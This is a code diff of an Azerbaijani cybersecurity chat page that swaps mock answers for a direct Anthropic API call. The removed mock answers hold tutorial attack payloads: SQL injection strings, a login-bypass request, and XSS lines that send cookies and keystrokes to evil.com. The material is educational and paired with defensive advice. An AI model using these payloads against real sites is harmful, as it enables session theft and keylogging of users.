@@ -1,7 +1,6 @@
 /**
- * ARN AI — NEURAL CHAT INTERFACE v6.0
- * Ultra-cinematic chat page with procedural space canvas.
- * Fully self-contained — no external store/service dependencies.
+ * ARN AI — NEURAL CHAT INTERFACE v7.0
+ * Real Claude API integration — no more mock responses.
  */
 
 import { useState, useRef, useEffect, useCallback } from 'react'
@@ -96,210 +95,37 @@ function mkArc(cx: number, cy: number): Arc {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-//  Mock AI Response Engine
+//  Claude API Call
 // ─────────────────────────────────────────────────────────────────────────────
 
-const MOCK_RESPONSES: Record<string, string> = {
-  nmap: `# Nmap ilə Port Scan
+const SYSTEM_PROMPT = `Sən ARN AI — kibertəhlükəsizlik üzrə ixtisaslaşmış neural assistantsan.
+Azərbaycan dilində cavab ver. Markdown formatından istifadə et.
+Kod nümunələri üçün həmişə kod bloklarından istifadə et.
+Birbaşa suala cavab ver — özünü təqdim etmə, capability list göstərmə.
+Penetration testing, etik hacking, şəbəkə təhlükəsizliyi, kriptoqrafiya,
+zəiflik analizi və müdafiə mövzularında dərin bilik sahibisən.`
 
-**Nmap** (Network Mapper) — şəbəkə kəşfi və təhlükəsizlik auditi üçün istifadə olunan açıq mənbəli alətdir.
+async function callClaudeAPI(messages: { role: string; content: string }[]): Promise<string> {
+  const response = await fetch('https://api.anthropic.com/v1/messages', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      model: 'claude-sonnet-4-20250514',
+      max_tokens: 1000,
+      system: SYSTEM_PROMPT,
+      messages,
+    }),
+  })
 
-## Əsas Scan Növləri
+  if (!response.ok) {
+    const err = await response.json().catch(() => ({}))
+    throw new Error((err as any)?.error?.message || `API error: ${response.status}`)
+  }
 
-### 1. TCP SYN Scan (Yarı-açıq scan)
-\`\`\`bash
-sudo nmap -sS -p 1-65535 target_ip
-\`\`\`
-
-### 2. Service Version Detection
-\`\`\`bash
-nmap -sV -sC target_ip
-\`\`\`
-
-### 3. OS Detection
-\`\`\`bash
-sudo nmap -O --osscan-guess target_ip
-\`\`\`
-
-### 4. Aggressive Scan
-\`\`\`bash
-nmap -A -T4 target_ip
-\`\`\`
-
-## Nəticələrin Analizi
-
-- **22/tcp open** — SSH servisi aktiv
-- **80/tcp open** — HTTP veb server
-- **443/tcp open** — HTTPS servisi
-
-> ⚠️ **Xəbərdarlıq:** Yalnız icazəli sistemlər üzərində test aparın. İcazəsiz scan qanunsuzdur.
-
-**Tövsiyə:** Həmişə \`--script vuln\` parametrindən istifadə edərək zəiflik yoxlaması aparın.`,
-
-  sql: `# SQL Injection Nədir?
-
-**SQL Injection** (SQLi) — veb tətbiqlərdə verilənlər bazasına müdaxilə etməyə imkan verən kritik zəiflikdir.
-
-## Hücum Növləri
-
-### 1. Classic Union-Based
-\`\`\`sql
-' UNION SELECT username, password FROM users--
-\`\`\`
-
-### 2. Boolean-Based Blind
-\`\`\`sql
-' AND 1=1--    → true
-' AND 1=2--    → false
-\`\`\`
-
-### 3. Time-Based Blind
-\`\`\`sql
-' AND SLEEP(5)--
-\`\`\`
-
-### 4. Error-Based
-\`\`\`sql
-' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
-\`\`\`
-
-## Müdafiə Yolları
-
-1. **Prepared Statements** istifadə edin:
-\`\`\`python
-cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
-\`\`\`
-
-2. **ORM** istifadə edin (SQLAlchemy, Django ORM)
-3. **WAF** (Web Application Firewall) quraşdırın
-4. **Input Validation** tətbiq edin
-
-> 💡 **Qızıl qayda:** Heç vaxt istifadəçi inputunu birbaşa SQL sorğusuna daxil etməyin!`,
-
-  burp: `# Burp Suite ilə Web Test
-
-**Burp Suite** — veb tətbiqlərin təhlükəsizlik testləri üçün ən populyar alətdir.
-
-## Əsas Modullar
-
-### 1. Proxy (Intercept)
-\`\`\`
-Browser → Burp Proxy (127.0.0.1:8080) → Target Server
-\`\`\`
-Bütün HTTP/HTTPS trafikini kəsib analiz edin.
-
-### 2. Repeater
-Sorğuları manual olaraq dəyişdirib yenidən göndərin:
-\`\`\`http
-POST /login HTTP/1.1
-Host: target.com
-Content-Type: application/x-www-form-urlencoded
-
-username=admin&password=' OR '1'='1
-\`\`\`
-
-### 3. Intruder (Brute Force)
-\`\`\`
-Attack Type: Sniper
-Payload: /usr/share/wordlists/rockyou.txt
-Target Parameter: §password§
-\`\`\`
-
-### 4. Scanner (Pro)
-- Avtomatik zəiflik aşkarlama
-- OWASP Top 10 yoxlama
-- Ətraflı hesabat
-
-## Praktik Addımlar
-
-1. **FoxyProxy** ilə brauzeri konfiqurasiya edin
-2. Burp CA sertifikatını quraşdırın
-3. **Scope** təyin edin — yalnız hədəf domenlər
-4. **Sitemap** yaradın
-5. Hər endpoint-i manual test edin
-
-> 🔒 **Etik hacking:** Yalnız bug bounty proqramlarında və ya yazılı icazə ilə test aparın.`,
-
-  xss: `# XSS (Cross-Site Scripting) Hücumu
-
-**XSS** — istifadəçinin brauzerində zərərli JavaScript kodu icra etməyə imkan verən zəiflikdir.
-
-## XSS Növləri
-
-### 1. Reflected XSS
-\`\`\`html
-https://target.com/search?q=<script>alert('XSS')</script>
-\`\`\`
-
-### 2. Stored XSS
-\`\`\`javascript
-// Foruma yazılan zərərli şərh
-<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
-\`\`\`
-
-### 3. DOM-Based XSS
-\`\`\`javascript
-// Zəif kod
-document.getElementById('output').innerHTML = location.hash.slice(1)
-
-// Exploit
-https://target.com/#<img src=x onerror=alert(1)>
-\`\`\`
-
-## Advanced Payloads
-
-\`\`\`javascript
-// Cookie stealing
-<script>
-new Image().src='https://evil.com/log?c='+btoa(document.cookie)
-</script>
-
-// Keylogger injection
-<script>
-document.onkeypress=e=>
-  fetch('https://evil.com/k?'+e.key)
-</script>
-\`\`\`
-
-## Müdafiə
-
-1. **Output Encoding** — HTML, JS, URL encoding
-2. **CSP** (Content Security Policy) header:
-\`\`\`
-Content-Security-Policy: default-src 'self'; script-src 'self'
-\`\`\`
-3. **HttpOnly** cookie flag
-4. **DOMPurify** kitabxanası istifadə edin
-
-> ⚡ XSS OWASP Top 10 siyahısında **#3** yerdədir.`,
-}
-
-const DEFAULT_RESPONSE = `## Neural Cavab
-
-Sualınız qeydə alındı. Mən **ARN AI** kibertəhlükəsizlik assistantıyam.
-
-Aşağıdakı mövzularda sizə kömək edə bilərəm:
-
-- 🔍 **Penetration Testing** — Nmap, Metasploit, Burp Suite
-- 💉 **Web Zəiflikləri** — SQL Injection, XSS, CSRF
-- 🛡️ **Müdafiə** — Firewall, IDS/IPS, WAF
-- 🔐 **Kriptoqrafiya** — Şifrələmə, Hash, PKI
-- 📡 **Şəbəkə Təhlükəsizliyi** — VPN, TLS, Wi-Fi hacking
-
-\`\`\`bash
-# Başlamaq üçün nümunə əmr:
-nmap -sV -sC -O target_ip
-\`\`\`
-
-> 💡 Daha ətraflı cavab üçün konkret mövzu seçin.`
-
-function getAIResponse(input: string): string {
-  const lower = input.toLowerCase()
-  if (lower.includes('nmap') || lower.includes('port scan') || lower.includes('port')) return MOCK_RESPONSES.nmap
-  if (lower.includes('sql') || lower.includes('injection')) return MOCK_RESPONSES.sql
-  if (lower.includes('burp') || lower.includes('web test')) return MOCK_RESPONSES.burp
-  if (lower.includes('xss') || lower.includes('cross-site') || lower.includes('script')) return MOCK_RESPONSES.xss
-  return DEFAULT_RESPONSE
+  const data = await response.json()
+  return data.content?.[0]?.text || 'Cavab alına bilmədi.'
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -307,9 +133,9 @@ function getAIResponse(input: string): string {
 // ─────────────────────────────────────────────────────────────────────────────
 
 const SUGGESTIONS = [
+  'CIA triad nədir?',
   'Nmap ilə port scan necə aparılır?',
-  'SQL injection nədir?',
-  'Burp Suite ilə web test',
+  'SQL Injection nədir və necə qarşısı alınır?',
   'XSS hücumu nədir?',
 ]
 
@@ -427,12 +253,31 @@ function ThinkingDots() {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+//  Error Banner
+// ─────────────────────────────────────────────────────────────────────────────
+
+function ErrorBanner({ msg, onDismiss }: { msg: string; onDismiss: () => void }) {
+  return (
+    <div style={{
+      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+      padding: '8px 14px', borderRadius: 8, margin: '0 0 10px',
+      background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.3)',
+      fontSize: 10, letterSpacing: 1, color: '#f87171', fontFamily: "'Space Mono', monospace",
+    }}>
+      <span>⚠ {msg}</span>
+      <button onClick={onDismiss} style={{ background: 'none', border: 'none', color: '#f87171', cursor: 'pointer', fontSize: 12 }}>✕</button>
+    </div>
+  )
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 //  Main Component
 // ─────────────────────────────────────────────────────────────────────────────
 
 export default function ChatPage() {
   const [input, setInput] = useState('')
   const [isLoading, setIsLoading] = useState(false)
+  const [error, setError] = useState<string | null>(null)
   const [sidebarOpen, setSidebarOpen] = useState(false)
   const [chats, setChats] = useState<ChatSession[]>([])
   const [currentChatId, setCurrentChatId] = useState<string | null>(null)
@@ -509,7 +354,6 @@ export default function ChatPage() {
       ctx.fillStyle = 'rgba(1,1,12,0.25)'
       ctx.fillRect(0, 0, w, h)
 
-      // Nebulae
       const nebs = [
         { dx: -0.3, dy: -0.2, r: 0.45, hue: 241, a: 0.04 },
         { dx: 0.25, dy: 0.15, r: 0.35, hue: 270, a: 0.035 },
@@ -527,7 +371,6 @@ export default function ChatPage() {
         ctx.fillRect(0, 0, w, h)
       })
 
-      // Stars
       starsRef.current.forEach(s => {
         const px = (mx - 0.5) * s.z * 20, py = (my - 0.5) * s.z * 20
         const tw = 0.65 + Math.sin(t * 1.8 + s.twOff) * 0.35
@@ -551,7 +394,6 @@ export default function ChatPage() {
       })
       ctx.globalAlpha = 1
 
-      // Particles
       particlesRef.current.forEach(p => {
         const dx = cx + (mx - 0.5) * 40 - p.x
         const dy = cy + (my - 0.5) * 40 - p.y
@@ -568,7 +410,6 @@ export default function ChatPage() {
         ctx.fill()
       })
 
-      // Electric arcs
       if (Math.random() < 0.02 && arcsRef.current.length < 5) {
         arcsRef.current.push(mkArc(Math.random() * w, Math.random() * h))
       }
@@ -586,7 +427,6 @@ export default function ChatPage() {
       })
       ctx.restore()
 
-      // Shockwaves
       clickFX.current = clickFX.current.filter(s => s.alpha > 0.008)
       clickFX.current.forEach(s => {
         s.r += (s.maxR - s.r) * 0.09; s.alpha *= 0.92
@@ -598,7 +438,6 @@ export default function ChatPage() {
         }
       })
 
-      // Vignette
       const vig = ctx.createRadialGradient(cx, cy, Math.min(w, h) * 0.4, cx, cy, Math.max(w, h) * 0.9)
       vig.addColorStop(0, 'rgba(0,0,0,0)')
       vig.addColorStop(1, 'rgba(0,0,8,0.55)')
@@ -638,6 +477,7 @@ export default function ChatPage() {
     setChats(prev => [newChat, ...prev])
     setCurrentChatId(id)
     setSidebarOpen(false)
+    setError(null)
   }
 
   // ── Delete chat ────────────────────────────────────────────────────────
@@ -658,9 +498,10 @@ export default function ChatPage() {
     })
   }
 
-  // ── Send message (streaming mock) ──────────────────────────────────────
+  // ── Send message — REAL API ────────────────────────────────────────────
   const handleSend = async () => {
     if (!input.trim() || isLoading) return
+    setError(null)
 
     let chatId = currentChatId
     if (!chatId) {
@@ -671,49 +512,81 @@ export default function ChatPage() {
       setCurrentChatId(id)
     }
 
-    const userMsg: Message = { id: Date.now().toString(), role: 'user', content: input.trim(), timestamp: new Date() }
     const userInput = input.trim()
+    const userMsg: Message = {
+      id: Date.now().toString(),
+      role: 'user',
+      content: userInput,
+      timestamp: new Date(),
+    }
     setInput('')
     setIsLoading(true)
 
-    // Add user message & update title
+    // Add user message & set title on first message
     setChats(prev => prev.map(c =>
       c.id !== chatId ? c : {
         ...c,
-        title: c.messages.length === 0 ? userInput.slice(0, 30) + (userInput.length > 30 ? '...' : '') : c.title,
+        title: c.messages.length === 0
+          ? userInput.slice(0, 32) + (userInput.length > 32 ? '…' : '')
+          : c.title,
         messages: [...c.messages, userMsg],
       }
     ))
 
-    // Add empty assistant message
+    // Add empty assistant placeholder
     const aId = (Date.now() + 1).toString()
     const aMsg: Message = { id: aId, role: 'assistant', content: '', timestamp: new Date() }
-
     setChats(prev => prev.map(c =>
       c.id !== chatId ? c : { ...c, messages: [...c.messages, aMsg] }
     ))
 
-    // Stream response char by char
-    const fullResponse = getAIResponse(userInput)
-    const chars = fullResponse.split('')
-    let accumulated = ''
+    try {
+      // Build full conversation history for the API
+      const currentMessages = chats
+        .find(c => c.id === chatId)?.messages
+        .filter(m => m.content.trim())
+        .map(m => ({ role: m.role, content: m.content })) || []
 
-    for (let i = 0; i < chars.length; i++) {
-      accumulated += chars[i]
-      const content = accumulated
-      const cid = chatId
+      const apiMessages = [...currentMessages, { role: 'user', content: userInput }]
+
+      // Call real Claude API
+      const fullResponse = await callClaudeAPI(apiMessages)
+
+      // Stream response character by character
+      const chars = fullResponse.split('')
+      let accumulated = ''
+
+      for (let i = 0; i < chars.length; i++) {
+        accumulated += chars[i]
+        const content = accumulated
+        const cid = chatId
+        const mid = aId
+        setChats(prev => prev.map(c =>
+          c.id !== cid ? c : {
+            ...c,
+            messages: c.messages.map(m => m.id === mid ? { ...m, content } : m),
+          }
+        ))
+        const delay = chars[i] === ' ' ? 2 : chars[i] === '\n' ? 10 : 3
+        await new Promise(r => setTimeout(r, delay))
+      }
+    } catch (err: any) {
+      // Show error in assistant bubble
+      const errMsg = err?.message || 'Xəta baş verdi. Yenidən cəhd edin.'
+      setError(errMsg)
       const mid = aId
+      const cid = chatId
       setChats(prev => prev.map(c =>
         c.id !== cid ? c : {
           ...c,
-          messages: c.messages.map(m => m.id === mid ? { ...m, content } : m),
+          messages: c.messages.map(m =>
+            m.id === mid ? { ...m, content: `⚠️ **Xəta:** ${errMsg}` } : m
+          ),
         }
       ))
-      const delay = chars[i] === ' ' ? 2 : chars[i] === '\n' ? 12 : 4
-      await new Promise(r => setTimeout(r, delay))
+    } finally {
+      setIsLoading(false)
     }
-
-    setIsLoading(false)
   }
 
   const handleKeyDown = (e: React.KeyboardEvent) => {
@@ -738,7 +611,6 @@ export default function ChatPage() {
       }}
       onClick={onBgClick}
     >
-      {/* ── Keyframes ────────────────────────────────────────────────── */}
       <style>{`
         @keyframes neuralPulse { 0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:1;transform:scale(1.2)} }
         @keyframes fadeUp { from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)} }
@@ -751,7 +623,6 @@ export default function ChatPage() {
         @keyframes msgAppear { from{opacity:0;transform:translateY(8px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)} }
         @keyframes glowRing { 0%,100%{box-shadow:0 0 8px rgba(99,102,241,.3)}50%{box-shadow:0 0 20px rgba(99,102,241,.6),0 0 40px rgba(99,102,241,.2)} }
         @keyframes spin { to{transform:rotate(360deg)} }
-        @keyframes sidebarIn { from{transform:translateX(-100%)}to{transform:translateX(0)} }
         .msg-appear{animation:msgAppear .4s cubic-bezier(.16,1,.3,1) both}
         textarea::placeholder{color:rgba(148,163,184,.35);font-family:'Space Mono',monospace;font-size:11px;letter-spacing:1px}
         textarea{scrollbar-width:none}
@@ -762,162 +633,95 @@ export default function ChatPage() {
         ::-webkit-scrollbar-thumb:hover{background:rgba(99,102,241,.4)}
       `}</style>
 
-      {/* ── Canvas ───────────────────────────────────────────────────── */}
+      {/* Canvas */}
       <canvas ref={canvasRef} style={{ position: 'absolute', top: 0, left: 0, zIndex: 0 }} />
 
-      {/* ── Scanlines & Chromatic ────────────────────────────────────── */}
+      {/* Scanlines */}
       <div style={{ position: 'absolute', inset: 0, zIndex: 1, pointerEvents: 'none', backgroundImage: 'repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,200,180,.005) 3px,rgba(0,200,180,.005) 4px)' }} />
       <div style={{ position: 'absolute', inset: 0, zIndex: 1, pointerEvents: 'none', backgroundImage: 'linear-gradient(90deg,rgba(255,0,128,.008) 0%,transparent 30%,transparent 70%,rgba(0,255,255,.008) 100%)' }} />
 
-      {/* ══════════════════════════════════════════════════════════════════
-          SIDEBAR
-      ══════════════════════════════════════════════════════════════════ */}
+      {/* ── SIDEBAR ── */}
       {sidebarOpen && (
-        <div
-          style={{ position: 'fixed', inset: 0, zIndex: 80, background: 'rgba(1,1,12,0.6)', backdropFilter: 'blur(4px)' }}
-          onClick={() => setSidebarOpen(false)}
-        />
+        <div style={{ position: 'fixed', inset: 0, zIndex: 80, background: 'rgba(1,1,12,0.6)', backdropFilter: 'blur(4px)' }}
+          onClick={() => setSidebarOpen(false)} />
       )}
 
-      <div
-        onClick={e => e.stopPropagation()}
-        style={{
-          position: 'fixed', top: 0, left: 0, bottom: 0, width: 300, zIndex: 90,
-          background: 'rgba(2,2,16,0.96)', borderRight: '1px solid rgba(99,102,241,0.15)',
-          backdropFilter: 'blur(30px)', display: 'flex', flexDirection: 'column',
-          transform: sidebarOpen ? 'translateX(0)' : 'translateX(-100%)',
-          transition: 'transform 0.4s cubic-bezier(0.16,1,0.3,1)', overflow: 'hidden',
-        }}
-      >
-        {/* Sidebar header */}
+      <div onClick={e => e.stopPropagation()} style={{
+        position: 'fixed', top: 0, left: 0, bottom: 0, width: 300, zIndex: 90,
+        background: 'rgba(2,2,16,0.96)', borderRight: '1px solid rgba(99,102,241,0.15)',
+        backdropFilter: 'blur(30px)', display: 'flex', flexDirection: 'column',
+        transform: sidebarOpen ? 'translateX(0)' : 'translateX(-100%)',
+        transition: 'transform 0.4s cubic-bezier(0.16,1,0.3,1)', overflow: 'hidden',
+      }}>
         <div style={{ padding: '20px 20px 16px', borderBottom: '1px solid rgba(99,102,241,0.12)' }}>
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 16 }}>
             <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
-              <div style={{
-                width: 32, height: 32, borderRadius: 9,
-                background: 'linear-gradient(135deg,#6366f1,#9333ea)',
-                display: 'flex', alignItems: 'center', justifyContent: 'center',
-                boxShadow: '0 0 18px rgba(99,102,241,.5)',
-                animation: 'logoPulse 2.5s ease-in-out infinite',
-              }}>
+              <div style={{ width: 32, height: 32, borderRadius: 9, background: 'linear-gradient(135deg,#6366f1,#9333ea)', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 18px rgba(99,102,241,.5)', animation: 'logoPulse 2.5s ease-in-out infinite' }}>
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" /></svg>
               </div>
               <span style={{ fontSize: 14, fontWeight: 700, letterSpacing: 3, background: 'linear-gradient(135deg,#818cf8,#c084fc)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>ARN AI</span>
             </div>
-            <button onClick={() => setSidebarOpen(false)} style={{
-              background: 'rgba(255,255,255,.04)', border: '1px solid rgba(255,255,255,.1)',
-              color: 'rgba(255,255,255,.4)', width: 28, height: 28, borderRadius: 6,
-              cursor: 'pointer', fontSize: 10, display: 'flex', alignItems: 'center', justifyContent: 'center',
-              transition: 'all .2s',
-            }}
+            <button onClick={() => setSidebarOpen(false)} style={{ background: 'rgba(255,255,255,.04)', border: '1px solid rgba(255,255,255,.1)', color: 'rgba(255,255,255,.4)', width: 28, height: 28, borderRadius: 6, cursor: 'pointer', fontSize: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', transition: 'all .2s' }}
               onMouseEnter={e => { e.currentTarget.style.background = 'rgba(255,80,80,.12)'; e.currentTarget.style.borderColor = 'rgba(255,80,80,.4)' }}
-              onMouseLeave={e => { e.currentTarget.style.background = 'rgba(255,255,255,.04)'; e.currentTarget.style.borderColor = 'rgba(255,255,255,.1)' }}
-            >✕</button>
+              onMouseLeave={e => { e.currentTarget.style.background = 'rgba(255,255,255,.04)'; e.currentTarget.style.borderColor = 'rgba(255,255,255,.1)' }}>✕</button>
           </div>
-
-          <button onClick={createNewChat} style={{
-            width: '100%', padding: '10px 14px', borderRadius: 9,
-            background: 'linear-gradient(135deg,rgba(99,102,241,.15),rgba(139,92,246,.1))',
-            border: '1px solid rgba(99,102,241,.4)', color: 'white', cursor: 'pointer',
-            fontSize: 9, letterSpacing: 3, fontWeight: 700,
-            display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
-            transition: 'all .25s cubic-bezier(.16,1,.3,1)', boxShadow: '0 0 16px rgba(99,102,241,.15)',
-          }}
-            onMouseEnter={e => { e.currentTarget.style.boxShadow = '0 0 28px rgba(99,102,241,.4)'; e.currentTarget.style.borderColor = 'rgba(99,102,241,.7)'; e.currentTarget.style.transform = 'translateY(-1px)' }}
-            onMouseLeave={e => { e.currentTarget.style.boxShadow = '0 0 16px rgba(99,102,241,.15)'; e.currentTarget.style.borderColor = 'rgba(99,102,241,.4)'; e.currentTarget.style.transform = 'translateY(0)' }}
-          >
-            <span style={{ fontSize: 12 }}>⚡</span>
-            <span>YENİ SÖHBƏT</span>
+          <button onClick={createNewChat} style={{ width: '100%', padding: '10px 14px', borderRadius: 9, background: 'linear-gradient(135deg,rgba(99,102,241,.15),rgba(139,92,246,.1))', border: '1px solid rgba(99,102,241,.4)', color: 'white', cursor: 'pointer', fontSize: 9, letterSpacing: 3, fontWeight: 700, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, transition: 'all .25s cubic-bezier(.16,1,.3,1)', boxShadow: '0 0 16px rgba(99,102,241,.15)' }}
+            onMouseEnter={e => { e.currentTarget.style.boxShadow = '0 0 28px rgba(99,102,241,.4)'; e.currentTarget.style.transform = 'translateY(-1px)' }}
+            onMouseLeave={e => { e.currentTarget.style.boxShadow = '0 0 16px rgba(99,102,241,.15)'; e.currentTarget.style.transform = 'translateY(0)' }}>
+            <span style={{ fontSize: 12 }}>⚡</span><span>YENİ SÖHBƏT</span>
           </button>
         </div>
 
-        {/* Chat list */}
         <div style={{ flex: 1, overflowY: 'auto', padding: '8px 12px' }}>
           <div style={{ fontSize: 8, letterSpacing: 3, color: 'rgba(129,140,248,.4)', padding: '8px 8px 6px' }}>// session.history</div>
           {chats.map(chat => (
             <div key={chat.id} onClick={() => { setCurrentChatId(chat.id); setSidebarOpen(false) }}
-              style={{
-                padding: '10px 12px', borderRadius: 8, marginBottom: 4, cursor: 'pointer',
-                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-                background: chat.id === currentChatId ? 'rgba(99,102,241,.12)' : 'transparent',
-                border: `1px solid ${chat.id === currentChatId ? 'rgba(99,102,241,.3)' : 'transparent'}`,
-                transition: 'all .2s',
-              }}
+              style={{ padding: '10px 12px', borderRadius: 8, marginBottom: 4, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: chat.id === currentChatId ? 'rgba(99,102,241,.12)' : 'transparent', border: `1px solid ${chat.id === currentChatId ? 'rgba(99,102,241,.3)' : 'transparent'}`, transition: 'all .2s' }}
               onMouseEnter={e => { if (chat.id !== currentChatId) e.currentTarget.style.background = 'rgba(99,102,241,.06)' }}
-              onMouseLeave={e => { if (chat.id !== currentChatId) e.currentTarget.style.background = 'transparent' }}
-            >
+              onMouseLeave={e => { if (chat.id !== currentChatId) e.currentTarget.style.background = 'transparent' }}>
               <div style={{ flex: 1, minWidth: 0, display: 'flex', alignItems: 'center', gap: 8 }}>
                 <span style={{ color: 'rgba(129,140,248,.5)', fontSize: 10, flexShrink: 0 }}>▸</span>
-                <span style={{
-                  fontSize: 10, letterSpacing: 1,
-                  color: chat.id === currentChatId ? '#a5b4fc' : 'rgba(148,163,184,.6)',
-                  overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
-                }}>{chat.title}</span>
+                <span style={{ fontSize: 10, letterSpacing: 1, color: chat.id === currentChatId ? '#a5b4fc' : 'rgba(148,163,184,.6)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{chat.title}</span>
               </div>
               {chats.length > 1 && (
                 <button onClick={e => { e.stopPropagation(); deleteChat(chat.id) }}
                   style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'rgba(148,163,184,.3)', fontSize: 10, padding: '2px 4px', borderRadius: 4, transition: 'all .2s', flexShrink: 0 }}
                   onMouseEnter={e => { e.currentTarget.style.color = '#f87171'; e.currentTarget.style.background = 'rgba(248,113,113,.1)' }}
-                  onMouseLeave={e => { e.currentTarget.style.color = 'rgba(148,163,184,.3)'; e.currentTarget.style.background = 'none' }}
-                >✕</button>
+                  onMouseLeave={e => { e.currentTarget.style.color = 'rgba(148,163,184,.3)'; e.currentTarget.style.background = 'none' }}>✕</button>
               )}
             </div>
           ))}
         </div>
 
-        {/* Sidebar footer */}
         <div style={{ padding: '14px 20px', borderTop: '1px solid rgba(99,102,241,.1)' }}>
           <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 8 }}>
             <span style={{ width: 5, height: 5, borderRadius: '50%', background: '#4ade80', boxShadow: '0 0 6px #4ade80', display: 'inline-block', animation: 'statusBlink 2s ease-in-out infinite' }} />
             <span style={{ fontSize: 8, letterSpacing: 2, color: 'rgba(99,102,241,.5)' }}>CORE ACTIVE</span>
           </div>
           <div style={{ fontSize: 7, letterSpacing: 2, color: 'rgba(99,102,241,.3)', lineHeight: 2 }}>
-            <div>ARN.AI NEURAL ENGINE v6.0</div>
+            <div>ARN.AI NEURAL ENGINE v7.0</div>
             <div>SESSIONS: {chats.length}</div>
           </div>
         </div>
       </div>
 
-      {/* ══════════════════════════════════════════════════════════════════
-          MAIN CHAT
-      ══════════════════════════════════════════════════════════════════ */}
+      {/* ── MAIN CHAT ── */}
       <div style={{ flex: 1, display: 'flex', flexDirection: 'column', position: 'relative', zIndex: 2, height: '100%', width: '100%' }}>
 
-        {/* ── Top Bar ──────────────────────────────────────────────────── */}
-        <div style={{
-          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-          padding: '12px 20px', borderBottom: '1px solid rgba(99,102,241,.1)',
-          background: 'rgba(1,1,12,.8)', backdropFilter: 'blur(20px)',
-          position: 'relative', zIndex: 10,
-        }}>
+        {/* Top Bar */}
+        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px 20px', borderBottom: '1px solid rgba(99,102,241,.1)', background: 'rgba(1,1,12,.8)', backdropFilter: 'blur(20px)', position: 'relative', zIndex: 10 }}>
           <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg,transparent,rgba(99,102,241,.3),transparent)', animation: 'borderPulse 3s ease-in-out infinite' }} />
-
           <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
-            {/* Sidebar toggle */}
             <button onClick={e => { e.stopPropagation(); setSidebarOpen(true) }}
-              style={{
-                background: 'rgba(99,102,241,.08)', border: '1px solid rgba(99,102,241,.25)',
-                color: '#818cf8', width: 36, height: 36, borderRadius: 9,
-                cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                transition: 'all .25s',
-              }}
-              onMouseEnter={e => { e.currentTarget.style.background = 'rgba(99,102,241,.15)'; e.currentTarget.style.borderColor = 'rgba(99,102,241,.5)'; e.currentTarget.style.boxShadow = '0 0 16px rgba(99,102,241,.3)' }}
-              onMouseLeave={e => { e.currentTarget.style.background = 'rgba(99,102,241,.08)'; e.currentTarget.style.borderColor = 'rgba(99,102,241,.25)'; e.currentTarget.style.boxShadow = 'none' }}
-            >
+              style={{ background: 'rgba(99,102,241,.08)', border: '1px solid rgba(99,102,241,.25)', color: '#818cf8', width: 36, height: 36, borderRadius: 9, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', transition: 'all .25s' }}
+              onMouseEnter={e => { e.currentTarget.style.background = 'rgba(99,102,241,.15)'; e.currentTarget.style.boxShadow = '0 0 16px rgba(99,102,241,.3)' }}
+              onMouseLeave={e => { e.currentTarget.style.background = 'rgba(99,102,241,.08)'; e.currentTarget.style.boxShadow = 'none' }}>
               <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                 <line x1="3" y1="6" x2="21" y2="6" /><line x1="3" y1="12" x2="15" y2="12" /><line x1="3" y1="18" x2="18" y2="18" />
               </svg>
             </button>
-
-            {/* Logo */}
             <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
-              <div style={{
-                width: 32, height: 32, borderRadius: 9,
-                background: 'linear-gradient(135deg,#6366f1,#9333ea)',
-                display: 'flex', alignItems: 'center', justifyContent: 'center',
-                boxShadow: '0 0 18px rgba(99,102,241,.45)',
-                animation: 'logoPulse 2.5s ease-in-out infinite',
-              }}>
+              <div style={{ width: 32, height: 32, borderRadius: 9, background: 'linear-gradient(135deg,#6366f1,#9333ea)', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 18px rgba(99,102,241,.45)', animation: 'logoPulse 2.5s ease-in-out infinite' }}>
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" /></svg>
               </div>
               <div>
@@ -926,22 +730,15 @@ export default function ChatPage() {
               </div>
             </div>
           </div>
-
           <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
             <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '5px 12px', borderRadius: 20, background: 'rgba(99,102,241,.06)', border: '1px solid rgba(99,102,241,.15)' }}>
